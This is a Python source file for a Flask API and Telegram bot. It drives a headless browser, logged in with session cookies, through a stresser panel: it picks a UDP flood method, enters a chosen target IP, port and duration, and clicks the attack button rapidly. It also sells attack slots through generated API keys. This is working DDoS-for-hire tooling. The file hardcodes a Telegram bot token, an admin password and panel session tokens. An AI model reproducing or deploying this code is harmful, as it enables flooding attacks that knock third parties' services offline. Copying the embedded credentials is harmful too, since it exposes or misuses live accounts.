# ============================================================
#  ⚡ API + TELEGRAM BOT — Single File
# ============================================================
from flask import Flask, jsonify, request
from flask_cors import CORS
from cloakbrowser import launch
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
import time
import threading
import json
import os
import secrets
import string
import asyncio
import queue
from datetime import datetime

# ============================================================
#  ⚙️ CONFIG
# ============================================================
METHOD         = "UDP-BIG"
ADMIN_PASSWORD = "krishna"
API_PORT       = 3938
MAX_PRELOADED  = 2
API_NAME       = "krishna father of STTRSERRR"
MAX_DURATION   = 300
MIN_DURATION   = 1

# 🤖 BOT CONFIG — TERA CREDENTIALS
BOT_TOKEN      = "8987069237:AAGH_ExqtgnBsiKpNrMoPwKslocK7Dx9cjs"
ADMIN_IDS      = [7883336006]

# ⚡ SPEED
SPAM_SLEEP     = 0.01
FILL_DELAY     = 0.02
METHOD_DELAY   = 0.3
POOL_CHECK     = 1
SPAWN_GAP      = 0.01

# ============================================================
#  🌐 PRELOAD SESSIONS (API /attack?key= wale ke liye)
# ============================================================
SESSIONS_DATA = [
    {"session_number": 1,  "access_key": "32de18ee49ba49ada55f3ca2e1fe8d1fd5601d5d1c8b48f2be24395e61c56482"},
    {"session_number": 2,  "access_key": "0021c1d3e3b0434e97cf81017dd2729b6a02ab98e8b1471f9a704c2b866b5148"},
]

# ============================================================
#  🌍 GLOBALS
# ============================================================
sessions             = []
sessions_lock        = threading.Lock()

active_attacks       = 0
active_attacks_lock  = threading.Lock()

api_keys             = {}
api_keys_lock        = threading.Lock()
api_keys_file        = "api_keys.json"

bot_tokens           = []
bot_tokens_lock      = threading.Lock()
bot_tokens_file      = "bot_tokens.json"

attack_queue         = queue.Queue()

worker_pool          = []
worker_pool_lock     = threading.Lock()
workers_loading      = 0
workers_loading_lock = threading.Lock()

attack_counter       = 0
attack_counter_lock  = threading.Lock()

session_index        = 0
session_index_lock   = threading.Lock()

SS_FOLDER = "screenshots"
os.makedirs(SS_FOLDER, exist_ok=True)

# ============================================================
#  🛠️ HELPERS
# ============================================================
def is_admin(user_id):
    return user_id in ADMIN_IDS

def generate_api_key():
    chars = string.ascii_letters + string.digits
    return ''.join(secrets.choice(chars) for _ in range(32))

def check_password(req):
    pwd = req.args.get('password') or req.headers.get('X-Password')
    return pwd == ADMIN_PASSWORD

def load_api_keys():
    global api_keys
    if os.path.exists(api_keys_file):
        try:
            with open(api_keys_file) as f:
                api_keys = json.load(f)
        except Exception:
            api_keys = {}
    else:
        api_keys = {}

def save_api_keys():
    try:
        with api_keys_lock:
            with open(api_keys_file, "w") as f:
                json.dump(api_keys, f, indent=2)
    except Exception:
        pass

def load_bot_tokens():
    global bot_tokens
    if os.path.exists(bot_tokens_file):
        try:
            with open(bot_tokens_file) as f:
                bot_tokens = json.load(f)
        except Exception:
            bot_tokens = []

def save_bot_tokens():
    try:
        with bot_tokens_lock:
            with open(bot_tokens_file, "w") as f:
                json.dump(bot_tokens, f, indent=2)
    except Exception:
        pass

def load_sessions():
    global sessions
    sessions = []
    for entry in SESSIONS_DATA:
        token = entry["access_key"]
        if "YAHAN" in token or len(token) < 32:
            continue
        cookies = [{
            "name": "auth_token", "value": token,
            "domain": "retrostress.net", "path": "/",
            "expires": 1794408155.470651,
            "httpOnly": True, "secure": True, "sameSite": "Lax"
        }]
        sessions.append({"id": entry["session_number"], "cookies": cookies})
    return len(sessions) > 0

def get_next_session():
    global session_index
    with session_index_lock:
        if not sessions:
            return None
        s = sessions[session_index % len(sessions)]
        session_index += 1
        return s

def get_total_slots():
    return len(sessions)

def get_used_slots():
    with api_keys_lock:
        return sum(v.get("slots", 0) for v in api_keys.values() if v.get("active"))

def get_available_slots():
    return get_total_slots() - get_used_slots()

def get_attack_ss_name(n):
    return f"atk{str(n).zfill(4)}.png"

def take_screenshot(page, name):
    try:
        path = os.path.join(SS_FOLDER, name)
        page.screenshot(path=path, full_page=False)
        return path
    except Exception:
        return None

# ============================================================
#  🔥 SHARED ATTACK LOGIC
# ============================================================
def select_udp_big(page, worker_name="W"):
    for retry in range(3):
        try:
            page.evaluate("""
                () => {
                    const btns = document.querySelectorAll('button');
                    for (const b of btns) {
                        const t = b.innerText || b.textContent || '';
                        if (t.includes('Network endpoint') || t.includes('Layer 4')) {
                            b.click(); return;
                        }
                    }
                }
            """)
            time.sleep(METHOD_DELAY)

            page.evaluate("""
                () => {
                    const s = document.querySelector('span.app-method-trigger-action');
                    if (s) { s.click(); return; }
                    const all = document.querySelectorAll('span');
                    for (const x of all) {
                        if (x.innerText && x.innerText.includes('Browse methods')) {
                            x.click(); return;
                        }
                    }
                }
            """)
            time.sleep(METHOD_DELAY)

            page.evaluate("""
                () => {
                    const btns = document.querySelectorAll('button');
                    for (const b of btns) {
                        const t = (b.innerText || b.textContent || '').trim();
                        if (t === 'UDP') { b.click(); return; }
                    }
                }
            """)
            time.sleep(METHOD_DELAY)

            ok = page.evaluate(f"""
                () => {{
                    const opts = document.querySelectorAll('button[role="option"]');
                    for (const o of opts) {{
                        const s = o.querySelector('strong');
                        if (s && s.textContent.trim() === '{METHOD}') {{
                            o.click(); return true;
                        }}
                    }}
                    const btns = document.querySelectorAll('button');
                    for (const b of btns) {{
                        const s = b.querySelector('strong');
                        if (s && s.textContent.trim() === '{METHOD}') {{
                            b.click(); return true;
                        }}
                    }}
                    return false;
                }}
            """)
            if ok:
                return True
        except Exception as e:
            print(f"[{worker_name}] select retry {retry+1}: {e}")
            time.sleep(1)
    return False

def do_attack_spam(page, target_ip, target_port, duration, worker_name="W"):
    page.evaluate("""
        (data) => {
            const ipEl = document.querySelector('input#test-url');
            if (ipEl) {
                ipEl.focus(); ipEl.value = data.ip;
                ipEl.dispatchEvent(new Event('input', { bubbles: true }));
                ipEl.dispatchEvent(new Event('change', { bubbles: true }));
            }
            const portEl = document.querySelector('input[aria-label="port"]');
            if (portEl) {
                portEl.focus(); portEl.value = data.port;
                portEl.dispatchEvent(new Event('input', { bubbles: true }));
                portEl.dispatchEvent(new Event('change', { bubbles: true }));
            }
        }
    """, {"ip": target_ip, "port": str(target_port)})
    time.sleep(FILL_DELAY)

    try:
        btn = page.locator('button.button.primary:has-text("Start test")')
    except Exception:
        return 0

    spam_dur = max(duration - 1, 1)
    start = time.time()
    clicks = 0

    print(f"[{worker_name}] 🚀 SPAM {spam_dur}s → {target_ip}:{target_port}")

    while time.time() - start < spam_dur:
        try:
            btn.click(force=True, timeout=1500)
            clicks += 1
            if clicks % 500 == 0:
                cps = int(clicks / max(time.time() - start, 1))
                print(f"[{worker_name}] ⚡ {clicks} | {cps} CPS")
            time.sleep(SPAM_SLEEP)
        except Exception:
            time.sleep(SPAM_SLEEP)

    print(f"[{worker_name}] ✅ DONE | {clicks} clicks")
    return clicks

# ============================================================
#  🔧 PRELOAD WORKER
# ============================================================
def worker_thread(worker_number):
    global active_attacks, workers_loading, attack_counter

    browser = None
    loading_decreased = False
    got_attack = False

    session = get_next_session()
    if not session:
        with workers_loading_lock:
            if workers_loading > 0:
                workers_loading -= 1
        return

    try:
        print(f"[Worker-{worker_number}] 🌐 Session {session['id']} opening...")
        browser = launch(headless=True)
        page = browser.new_page()
        page.set_viewport_size({"width": 1280, "height": 720})
        page.context.add_cookies(session["cookies"])
        page.goto("https://retrostress.net/panel",
                  wait_until="domcontentloaded", timeout=60000)
        time.sleep(1.5)

        if "auth" in page.url or "login" in page.url:
            print(f"[Worker-{worker_number}] ❌ Session expired")
            return

        take_screenshot(page, f"panel_w{worker_number}.png")

        if not select_udp_big(page, f"Worker-{worker_number}"):
            print(f"[Worker-{worker_number}] ❌ Method select failed")
            return

        print(f"[Worker-{worker_number}] ✅ Ready")

        with workers_loading_lock:
            if workers_loading > 0:
                workers_loading -= 1
            loading_decreased = True

        with worker_pool_lock:
            if len(worker_pool) >= MAX_PRELOADED:
                return
            worker_pool.append(worker_number)

        job = attack_queue.get(block=True)
        got_attack = True

        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)

        with attack_counter_lock:
            attack_counter += 1
            atk_num = attack_counter

        do_attack_spam(page, job["ip"], job["port"], job["duration"],
                       f"Worker-{worker_number}")
        take_screenshot(page, get_attack_ss_name(atk_num))

    except Exception as e:
        print(f"[Worker-{worker_number}] ❌ {e}")
    finally:
        if browser:
            try:
                browser.close()
            except Exception:
                pass
        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)
        if not loading_decreased:
            with workers_loading_lock:
                if workers_loading > 0:
                    workers_loading -= 1
        if got_attack:
            with active_attacks_lock:
                if active_attacks > 0:
                    active_attacks -= 1

# ============================================================
#  🔑 TOKEN WORKER
# ============================================================
def token_worker(token, target_ip, target_port, duration, attack_id):
    global active_attacks

    browser = None
    short = token[:12] + "..." if len(token) > 12 else token

    try:
        print(f"[TokenWorker-{attack_id}] 🌐 Token {short} | Opening...")

        browser = launch(headless=True)
        page = browser.new_page()
        page.set_viewport_size({"width": 1280, "height": 720})

        cookies = [{
            "name": "auth_token", "value": token,
            "domain": "retrostress.net", "path": "/",
            "expires": 1794408155.470651,
            "httpOnly": True, "secure": True, "sameSite": "Lax"
        }]
        page.context.add_cookies(cookies)

        page.goto("https://retrostress.net/panel",
                  wait_until="domcontentloaded", timeout=60000)
        time.sleep(1.5)

        if "auth" in page.url or "login" in page.url:
            print(f"[TokenWorker-{attack_id}] ❌ Token invalid")
            return

        print(f"[TokenWorker-{attack_id}] ✅ Panel opened")

        if not select_udp_big(page, f"TokenWorker-{attack_id}"):
            print(f"[TokenWorker-{attack_id}] ❌ Method select failed")
            return

        print(f"[TokenWorker-{attack_id}] ✅ UDP-BIG ready")

        do_attack_spam(page, target_ip, target_port, duration,
                       f"TokenWorker-{attack_id}")
        take_screenshot(page, get_attack_ss_name(attack_id))

    except Exception as e:
        print(f"[TokenWorker-{attack_id}] ❌ {e}")
    finally:
        if browser:
            try:
                browser.close()
            except Exception:
                pass
        with active_attacks_lock:
            if active_attacks > 0:
                active_attacks -= 1
        print(f"[TokenWorker-{attack_id}] 🔒 Released")

# ============================================================
#  🎯 FIRE WITH TOKENS
# ============================================================
def fire_with_tokens(target_ip, target_port, duration, tokens):
    global active_attacks

    if not target_ip:
        return {"status": "error", "message": "IP required"}
    try:
        target_port = int(target_port)
        duration = int(duration)
    except ValueError:
        return {"status": "error", "message": "Invalid port/duration"}

    if not (1 <= target_port <= 65535):
        return {"status": "error", "message": "Port 1-65535"}
    if not (MIN_DURATION <= duration <= MAX_DURATION):
        return {"status": "error", "message": f"Duration {MIN_DURATION}-{MAX_DURATION}s"}

    tokens = [t.strip() for t in tokens if t and t.strip()]
    if not tokens:
        return {"status": "error", "message": "No tokens"}

    ids = []
    for tok in tokens:
        with active_attacks_lock:
            active_attacks += 1
            aid = active_attacks
        threading.Thread(
            target=token_worker,
            args=(tok, target_ip, target_port, duration, aid),
            daemon=True
        ).start()
        ids.append(aid)
        time.sleep(0.1)

    return {
        "status": "success",
        "spawned": len(tokens),
        "attack_ids": ids,
        "target": f"{target_ip}:{target_port}",
        "duration": f"{duration}s"
    }

# ============================================================
#  🌊 POOL MANAGER
# ============================================================
worker_counter = 0
worker_counter_lock = threading.Lock()

def pool_manager():
    global workers_loading, worker_counter
    while True:
        try:
            with worker_pool_lock:
                pool = len(worker_pool)
            with workers_loading_lock:
                loading = workers_loading

            needed = MAX_PRELOADED - (pool + loading)
            if needed > 0:
                for _ in range(needed):
                    with workers_loading_lock:
                        workers_loading += 1
                    with worker_counter_lock:
                        worker_counter += 1
                        wn = worker_counter
                    threading.Thread(target=worker_thread, args=(wn,), daemon=True).start()
                    time.sleep(SPAWN_GAP)
        except Exception as e:
            print(f"[Pool] {e}")
        time.sleep(POOL_CHECK)

# ============================================================
#  🚀 FLASK API
# ============================================================
app = Flask(__name__)
CORS(app)

@app.route('/')
def home():
    with worker_pool_lock:
        pool = len(worker_pool)
    return jsonify({
        "status": "🟢 Online",
        "api_name": API_NAME,
        "port": API_PORT,
        "pool_ready": pool,
        "max_preloaded": MAX_PRELOADED,
        "sessions": len(sessions),
        "bot_tokens": len(bot_tokens),
        "cps_per_worker": int(1/SPAM_SLEEP),
        "max_pps": pool * int(1/SPAM_SLEEP)
    })

@app.route('/status')
def status():
    with worker_pool_lock:
        pool = len(worker_pool)
    with workers_loading_lock:
        loading = workers_loading
    with active_attacks_lock:
        active = active_attacks
    with bot_tokens_lock:
        bt = len(bot_tokens)
    return jsonify({
        "status": "🟢 Online",
        "api_name": API_NAME,
        "pool_ready": pool,
        "pool_loading": loading,
        "max_pool": MAX_PRELOADED,
        "active_attacks": active,
        "sessions": len(sessions),
        "bot_tokens": bt,
        "cps_per_worker": int(1/SPAM_SLEEP),
        "max_pps": pool * int(1/SPAM_SLEEP)
    })

@app.route('/admin/generate_key')
def gen_key():
    if not check_password(request):
        return jsonify({"status": "error", "message": "wrong password"}), 403
    try:
        slots = int(request.args.get('slots', 1))
    except ValueError:
        return jsonify({"status": "error", "message": "invalid slots"}), 400
    if slots < 1:
        return jsonify({"status": "error"}), 400
    if slots > get_available_slots():
        return jsonify({"status": "error", "available": get_available_slots()}), 400

    k = generate_api_key()
    with api_keys_lock:
        api_keys[k] = {"slots": slots, "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "active": True}
    save_api_keys()
    return jsonify({"status": "success", "api_key": k, "slots": slots, "api_name": API_NAME})

@app.route('/attack/<ip>/<int:port>/<int:time_sec>')
def attack_url(ip, port, time_sec):
    global active_attacks
    key = request.args.get('key') or request.headers.get('X-API-Key')
    with api_keys_lock:
        kd = api_keys.get(key) if key else None
    if not kd or not kd.get("active"):
        return jsonify({"status": "error", "message": "invalid key"}), 403
    if not (MIN_DURATION <= time_sec <= MAX_DURATION):
        return jsonify({"status": "error"}), 400
    with worker_pool_lock:
        pool = len(worker_pool)
    if pool == 0:
        return jsonify({"status": "error", "message": "no workers ready"}), 429

    with active_attacks_lock:
        active_attacks += 1
        aid = active_attacks

    attack_queue.put({"ip": ip, "port": port, "duration": time_sec, "attack_id": aid})
    return jsonify({"status": "success", "attack_id": aid, "target": f"{ip}:{port}", "pool_ready": pool})

@app.route('/attack/token', methods=['POST'])
def attack_token_route():
    data = request.get_json(force=True, silent=True) or {}
    ip = data.get("ip")
    port = data.get("port", 80)
    dur = data.get("duration", 60)
    toks = data.get("tokens", [])
    if not ip or not toks:
        return jsonify({"status": "error", "message": "ip and tokens required"}), 400
    res = fire_with_tokens(ip, port, dur, toks)
    return jsonify(res), (200 if res["status"] == "success" else 400)

def run_flask():
    app.run(host='0.0.0.0', port=API_PORT, debug=False, threaded=True, use_reloader=False)

# ============================================================
#  🤖 TELEGRAM BOT
# ============================================================
def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Attack Fire", callback_data="menu_attack"),
         InlineKeyboardButton("🔑 Tokens", callback_data="menu_tokens")],
        [InlineKeyboardButton("📊 Status", callback_data="menu_status"),
         InlineKeyboardButton("📸 Screenshots", callback_data="menu_screenshots")]
    ])

def tokens_menu_kb():
    with bot_tokens_lock:
        n = len(bot_tokens)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Token", callback_data="token_add")],
        [InlineKeyboardButton(f"📋 List Tokens ({n})", callback_data="token_list")],
        [InlineKeyboardButton("🗑️ Remove Token", callback_data="token_remove")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_home")]
    ])

def back_home_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu_home")]])

def attack_tokens_kb():
    with bot_tokens_lock:
        toks = list(bot_tokens)
    rows = []
    for i, t in enumerate(toks):
        label = t.get("label") or f"Token {i+1}"
        short = t["token"][:8] + "…" + t["token"][-4:]
        rows.append([InlineKeyboardButton(f"⚡ {label} [{short}]",
                                          callback_data=f"use_token_{t['id']}")])
    rows.append([InlineKeyboardButton("🔥 FIRE ALL", callback_data="attack_fireall")])
    rows.append([InlineKeyboardButton("🔙 Back", callback_data="menu_home")])
    return InlineKeyboardMarkup(rows)

async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ Access denied.")
        return
    with bot_tokens_lock:
        n = len(bot_tokens)
    await update.message.reply_text(
        f"⚡ *{API_NAME}*\n\n"
        f"🤖 Bot + API running\n"
        f"🔑 Tokens: {n}\n\n"
        f"Choose an option:",
        parse_mode="Markdown",
        reply_markup=main_menu_kb()
    )

async def button_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not is_admin(uid):
        await q.edit_message_text("❌ Access denied.")
        return

    data = q.data

    if data == "menu_home":
        with bot_tokens_lock:
            n = len(bot_tokens)
        await q.edit_message_text(
            f"⚡ *{API_NAME}*\n\n🔑 Tokens: {n}\n\nMain menu:",
            parse_mode="Markdown",
            reply_markup=main_menu_kb()
        )

    elif data == "menu_tokens":
        with bot_tokens_lock:
            n = len(bot_tokens)
        await q.edit_message_text(
            f"🔑 *Token Manager*\n\nSaved tokens: {n}\n\n"
            f"Add your retrostress `auth_token` cookies here.\n"
            f"Bot attacks will use these tokens.",
            parse_mode="Markdown",
            reply_markup=tokens_menu_kb()
        )

    elif data == "token_add":
        ctx.user_data["expecting"] = "token_add"
        await q.edit_message_text(
            "📝 *Add Token*\n\n"
            "Send the token in this format:\n\n"
            "`TOKEN`\n"
            "or\n"
            "`LABEL | TOKEN`\n\n"
            "Example:\n"
            "`Manu | 32de18ee49ba49ada5...`",
            parse_mode="Markdown",
            reply_markup=back_home_kb()
        )

    elif data == "token_list":
        with bot_tokens_lock:
            toks = list(bot_tokens)
        if not toks:
            await q.edit_message_text("📭 No tokens saved.",
                                       reply_markup=tokens_menu_kb())
            return
        text = "📋 *Saved Tokens*\n\n"
        for i, t in enumerate(toks, 1):
            label = t.get("label") or f"Token {i}"
            short = t["token"][:10] + "…" + t["token"][-4:]
            text += f"*{i}.* {label}\n`{short}`\n\n"
        await q.edit_message_text(text, parse_mode="Markdown",
                                   reply_markup=tokens_menu_kb())

    elif data == "token_remove":
        with bot_tokens_lock:
            toks = list(bot_tokens)
        if not toks:
            await q.edit_message_text("📭 No tokens to remove.",
                                       reply_markup=tokens_menu_kb())
            return
        rows = []
        for i, t in enumerate(toks):
            label = t.get("label") or f"Token {i+1}"
            rows.append([InlineKeyboardButton(f"🗑️ {label}",
                                              callback_data=f"del_token_{t['id']}")])
        rows.append([InlineKeyboardButton("🔙 Back", callback_data="menu_tokens")])
        await q.edit_message_text("🗑️ *Remove Token*\nPick one:",
                                   parse_mode="Markdown",
                                   reply_markup=InlineKeyboardMarkup(rows))

    elif data.startswith("del_token_"):
        tid = data.replace("del_token_", "")
        global bot_tokens
        with bot_tokens_lock:
            bot_tokens = [t for t in bot_tokens if t["id"] != tid]
        save_bot_tokens()
        await q.edit_message_text(f"✅ Token removed.\n\nRemaining: {len(bot_tokens)}",
                                   reply_markup=tokens_menu_kb())

    elif data == "menu_status":
        with worker_pool_lock:
            pool = len(worker_pool)
        with workers_loading_lock:
            loading = workers_loading
        with active_attacks_lock:
            active = active_attacks
        with bot_tokens_lock:
            bt = len(bot_tokens)
        text = (
            f"📊 *STATUS*\n\n"
            f"🟢 API: Online\n"
            f"⚙️ Pool Ready: `{pool}/{MAX_PRELOADED}`\n"
            f"⏳ Loading: `{loading}`\n"
            f"🎯 Active Attacks: `{active}`\n"
            f"🌐 Sessions: `{len(sessions)}`\n"
            f"🔑 Bot Tokens: `{bt}`\n"
            f"⚡ CPS/Worker: `{int(1/SPAM_SLEEP)}`\n"
            f"🔥 Max PPS: `{pool * int(1/SPAM_SLEEP)}`"
        )
        await q.edit_message_text(text, parse_mode="Markdown",
                                   reply_markup=back_home_kb())

    elif data == "menu_screenshots":
        try:
            files = sorted(os.listdir(SS_FOLDER))
        except Exception:
            files = []
        text = f"📸 *Screenshots* ({len(files)})\n\n"
        text += "\n".join(f"• `{f}`" for f in files[-15:]) or "(empty)"
        await q.edit_message_text(text, parse_mode="Markdown",
                                   reply_markup=back_home_kb())

    elif data == "menu_attack":
        with bot_tokens_lock:
            toks = list(bot_tokens)
        if not toks:
            await q.edit_message_text(
                "⚠️ *No tokens saved!*\n\nGo to 🔑 Tokens → Add Token first.",
                parse_mode="Markdown",
                reply_markup=main_menu_kb()
            )
            return
        await q.edit_message_text(
            f"🎯 *Attack Menu*\n\n"
            f"Saved tokens: {len(toks)}\n\n"
            f"• Click a token to attack with *only that token*\n"
            f"• Or click 🔥 FIRE ALL to attack with all tokens",
            parse_mode="Markdown",
            reply_markup=attack_tokens_kb()
        )

    elif data.startswith("use_token_"):
        tid = data.replace("use_token_", "")
        with bot_tokens_lock:
            tok = next((t for t in bot_tokens if t["id"] == tid), None)
        if not tok:
            await q.edit_message_text("❌ Token not found.", reply_markup=main_menu_kb())
            return
        ctx.user_data["attack_tokens"] = [tok["token"]]
        ctx.user_data["attack_label"] = tok.get("label") or "Token"
        ctx.user_data["expecting"] = "attack_ip"
        await q.edit_message_text(
            f"⚡ Using token: *{ctx.user_data['attack_label']}*\n\n"
            f"🎯 Send target *IP*:",
            parse_mode="Markdown",
            reply_markup=back_home_kb()
        )

    elif data == "attack_fireall":
        with bot_tokens_lock:
            toks = [t["token"] for t in bot_tokens]
        if not toks:
            await q.edit_message_text("❌ No tokens.", reply_markup=main_menu_kb())
            return
        ctx.user_data["attack_tokens"] = toks
        ctx.user_data["attack_label"] = f"ALL ({len(toks)})"
        ctx.user_data["expecting"] = "attack_ip"
        await q.edit_message_text(
            f"🔥 *FIRE ALL MODE*\n\n"
            f"Using {len(toks)} tokens simultaneously\n\n"
            f"🎯 Send target *IP*:",
            parse_mode="Markdown",
            reply_markup=back_home_kb()
        )

async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        return

    expecting = ctx.user_data.get("expecting")
    text = (update.message.text or "").strip()

    if not expecting:
        return

    if expecting == "token_add":
        if "|" in text:
            label, token = [x.strip() for x in text.split("|", 1)]
        else:
            with bot_tokens_lock:
                label = f"Token {len(bot_tokens)+1}"
            token = text

        if len(token) < 32:
            await update.message.reply_text("❌ Token too short. Try again.")
            return

        tid = secrets.token_hex(4)
        with bot_tokens_lock:
            bot_tokens.append({"id": tid, "token": token, "label": label,
                                "added_by": uid})
            n = len(bot_tokens)
        save_bot_tokens()
        ctx.user_data.pop("expecting", None)

        await update.message.reply_text(
            f"✅ *Token Added*\n\n"
            f"Label: `{label}`\n"
            f"Token: `{token[:10]}…{token[-4:]}`\n\n"
            f"Total tokens: {n}",
            parse_mode="Markdown",
            reply_markup=main_menu_kb()
        )

    elif expecting == "attack_ip":
        ctx.user_data["attack_ip"] = text
        ctx.user_data["expecting"] = "attack_port"
        await update.message.reply_text(f"🔌 IP set: `{text}`\n\nNow send *PORT*:",
                                         parse_mode="Markdown")

    elif expecting == "attack_port":
        try:
            p = int(text)
            if not (1 <= p <= 65535):
                raise ValueError
        except ValueError:
            await update.message.reply_text("❌ Invalid port. Send 1-65535.")
            return
        ctx.user_data["attack_port"] = p
        ctx.user_data["expecting"] = "attack_dur"
        await update.message.reply_text(
            f"🔌 Port: `{p}`\n\nNow send *DURATION* (seconds, {MIN_DURATION}-{MAX_DURATION}):",
            parse_mode="Markdown")

    elif expecting == "attack_dur":
        try:
            d = int(text)
            if not (MIN_DURATION <= d <= MAX_DURATION):
                raise ValueError
        except ValueError:
            await update.message.reply_text(f"❌ Send duration {MIN_DURATION}-{MAX_DURATION}.")
            return

        ip = ctx.user_data.get("attack_ip")
        port = ctx.user_data.get("attack_port")
        toks = ctx.user_data.get("attack_tokens", [])
        label = ctx.user_data.get("attack_label", "")

        result = fire_with_tokens(ip, port, d, toks)

        ctx.user_data.pop("expecting", None)
        ctx.user_data.pop("attack_ip", None)
        ctx.user_data.pop("attack_port", None)
        ctx.user_data.pop("attack_tokens", None)

        if result["status"] == "success":
            await update.message.reply_text(
                f"🚀 *ATTACK LAUNCHED!*\n\n"
                f"🎯 Target: `{result['target']}`\n"
                f"⏱️ Duration: `{result['duration']}`\n"
                f"⚡ Tokens Used: `{result['spawned']}`\n"
                f"🔑 Token: `{label}`\n"
                f"🆔 Attack IDs: `{result['attack_ids']}`\n\n"
                f"Workers are spawning now (20s load time)...",
                parse_mode="Markdown",
                reply_markup=main_menu_kb()
            )
        else:
            await update.message.reply_text(f"❌ Failed: {result['message']}",
                                             reply_markup=main_menu_kb())

# ============================================================
#  ▶️ BOT RUNNER
# ============================================================
def run_bot():
    print("🤖 Starting Telegram bot...")
    app_bot = Application.builder().token(BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start_cmd))
    app_bot.add_handler(CallbackQueryHandler(button_cb))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("✅ Bot polling started")
    app_bot.run_polling(allowed_updates=Update.ALL_TYPES)

# ============================================================
#  🎬 MAIN
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print(f"⚡ {API_NAME} — API + BOT")
    print("=" * 60)

    load_api_keys()
    load_bot_tokens()

    if not load_sessions():
        print("⚠️ No preload sessions. Bot tokens will still work.")

    print(f"📊 Preload Sessions: {len(sessions)}")
    print(f"🔑 Saved Bot Tokens: {len(bot_tokens)}")
    print(f"🎯 MAX_PRELOADED:    {MAX_PRELOADED}")
    print(f"⚡ CPS/Worker:       {int(1/SPAM_SLEEP)}")
    print(f"🚀 API Port:         {API_PORT}")
    print(f"👤 Owner ID:         {ADMIN_IDS}")

    threading.Thread(target=pool_manager, daemon=True).start()
    threading.Thread(target=run_flask, daemon=True).start()
    print(f"✅ Flask API running on http://0.0.0.0:{API_PORT}")

    time.sleep(2)
    run_bot()